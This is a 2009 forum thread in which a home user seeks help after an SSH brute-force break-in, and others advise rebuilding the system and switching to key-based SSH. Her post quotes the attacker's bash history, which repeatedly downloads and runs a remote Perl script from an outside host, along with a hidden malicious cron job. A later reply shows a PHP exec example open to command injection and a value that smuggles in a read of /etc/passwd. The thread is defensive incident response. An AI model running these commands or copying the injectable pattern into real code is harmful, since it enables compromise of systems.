---
title: "Server hacked, need advice"
date: 2009-09-01
forum: Security
---

### Post by Lori700698 on 2009-09-01
I got hacked, I know were they entered and what I did wrong.  (Brute Force SSH attack and way too easy user/login)  Clamscan actually found all the files and I deleted them before I even realized I had been hacked so I don't have much to look at.  I have the .bash history that I'm going to post.  Is it necessary for me to re-install everything?  I spent months getting this together for myself (not production/only home user)  Is there a way to get it all cleaned up?  I've removed the files and the cron job it was running and also found a couple of hidden temp files and deleted them.  I closed up the ssh port and denied access to all for ssh logins.  
If I can get it cleaned up  without a re-install, I want to know how to search and view hidden files, just to be sure. And were can I look to make sure my computer isn't attacking others.  I have no information of importance on it that a hacker could steal or use.

All of the files below have been deleted thanks to clamscan!
Thanks for looking and giving me some solid advice!!!
Lori

exit
exit
wget vascao.100free.com/scanbr.txt;perl scanbr.txt
s x
ps x
ls
pico scanbr.txt
wget vascao.100free.com/scanbr.txt;perl scanbr.txt
cd /var/tmp
wget vascao.100free.com/scanbr.txt;perl scanbr.txt
pico scanbr.txt
perl scanbr.txt
exit
exit

---

### Post by dmizer on 2009-09-01
> **Lori700698 said:**
> Is it necessary for me to re-install everything?

Unfortunately ... yes. You can never be sure that you didn't miss something unless you blow it all away. Use a live CD to back up all your critical data. Also, carefully inspect your web files for anything at all you didn't put there.

On your next install, I highly suggest disabling wget, as I was compromised with the same tool. Although if they had SSH access, that would be a moot point. Are you positive they accessed your machine via SSH?

Edit:
Upon reviewing the posted pearl script, I also suggest you review your email accounts and any other login information you might have stored in your web browser. Update any and all passwords you can think of, and do so from a known clean machine (use a live CD if you have to).

Is your web server live on the internet? If so, disable it ASAP.

---

### Post by Lori700698 on 2009-09-01
Yea, web server is online and I will turn off asap, (can I ask why?) Also here is what I found on my log watch that made me know I had an issue.  I haven't used my user lori in moths, I actually forgot about it, which is were  breach was made.  I can't find the entry but lori was physically logged in twice and I shut port 22 off at that point.

 sshd:
    Authentication Failures:
       unknown (203169139183.inscyber.hk): 421 Time(s)
       ftp (203169139183.inscyber.hk): 3 Time(s)
       root (203169139183.inscyber.hk): 1 Time(s)
    Invalid Users:
       Unknown Account: 421 Time(s)

and I found the next day this in the httpd:

 Requests with error response codes
    405 Method Not Allowed
       /home: 32 Time(s)

Then the next day

 Illegal users from:
    189.158.229.203 (dsl-189-158-229-203-dyn.prod-infinitum.com.mx): 2 times
       lori: 2 times
 
 Login attempted when not in AllowUsers list:
    lori : 1 Time(s)

Here's the cron job that was killing my machine

User lori:
       /tmp/ / /.access.log/y2kupdate >/dev/null 2>&1: 1440

---

### Post by Copernicus1234 on 2009-09-01
Bad hacker. The good ones you dont even notice anything is wrong, so you dont check the logs. Or, most people dont.

---

### Post by dmizer on 2009-09-01
> **Lori700698 said:**
> Yea, web server is online and I will turn off asap, (can I ask why?)
Because you're probably a host for whatever badware the hacker installed on your machine. In fact, you'll do everyone a favor by physically disconnecting that machine entirely. If that's your only computer, then use a live CD instead.

You should consider any service that is accessible from the unfettered internet as "in production" and treat it as such security-wise, even if you're not hosting a high traffic site.

What kind of site were you hosting? I suspect you were probably initially compromised via your web host, and SSH access was gained later.

---

### Post by Lori700698 on 2009-09-01
The sites are only one page non-finished junk, I was playing around learning with the name server and making web pages.  The whole server was just for fun and to learn about webdesign, which interests me.  How would something get on through this?  (If you could give me the short of it, I will read up on the subject for sure)

---

### Post by Lori700698 on 2009-09-01
Thanks for the advice dmizer, I'm going to take it off line and rebuild over the weekend.  I'm going to look at it deeper over the next couple of days just to learn and see what else they got into, if they did come in from my web server first, what logs would show the breach and what am I looking for?  I guess I need to understand this so I don't repeat my mistakes.  Talk about deflating a persons ego, are there any files I can safely back up and re-use.  (like Bind9 and Apache?)

---

### Post by bodhi.zazen on 2009-09-01
You were hacked via ssh.

Secure your ssh server :

Hint: use keys and disable passwords =)

[SSH/OpenSSH/Keys - Community Ubuntu Documentation]("https://help.ubuntu.com/community/SSH/OpenSSH/Keys")

---

### Post by Lori700698 on 2009-09-01
> **bodhi.zazen said:**
> You were hacked via ssh.



That's was what I thought, dmizer seemed to think there was more.  I didn't notice anything strange anywhere else so I assumed maybe I was overlooking something.  How does one attack/hack a web site and gain access to the machine?

---

### Post by EJeanmaire on 2009-09-01
> **Lori700698 said:**
> That's was what I thought, dmizer seemed to think there was more. 

Once the attacker got into your system via SSH, the number of additional backdoor/vulnerabilities he placed on your machine are endless.  

> **Lori700698 said:**
> I didn't notice anything strange anywhere else so I assumed maybe I was overlooking something.  How does one attack/hack a web site and gain access to the machine?

Are you using PHP?  If not coded with security in mind there are plenty of ways to exploit your website.  MySQL?  SQL Injection.  Old Apache? vulnerabilities as well.

Like they said, you should rebuild the system.

---

### Post by Sporkman on 2009-09-02
> **EJeanmaire said:**
> Are you using PHP?  If not coded with security in mind there are plenty of ways to exploit your website.

For example, if you have a page that takes user input, and runs it through a commandline tool, such as:

Enter your email address:[    ]

then you take their email address, and do (in PHP), for example:

exec("sendmail $email_addr < blahblah.txt");

then guess what happens if they enter "hackmeister@shadyisp.ru < /etc/passwd ; /dev/null" as their email address. :)

---

### Post by dmizer on 2009-09-02
> **Lori700698 said:**
> That's was what I thought, dmizer seemed to think there was more.  I didn't notice anything strange anywhere else so I assumed maybe I was overlooking something.  How does one attack/hack a web site and gain access to the machine?
This is why I thought there was more: [http://ubuntuforums.org/showthread.php?t=688979](http://ubuntuforums.org/showthread.php?t=688979) (my own experience)

The script and method is extremely similar, so I thought there might have been a different/additional inroute, but bodhi's right. You were compromised via SSH.

---

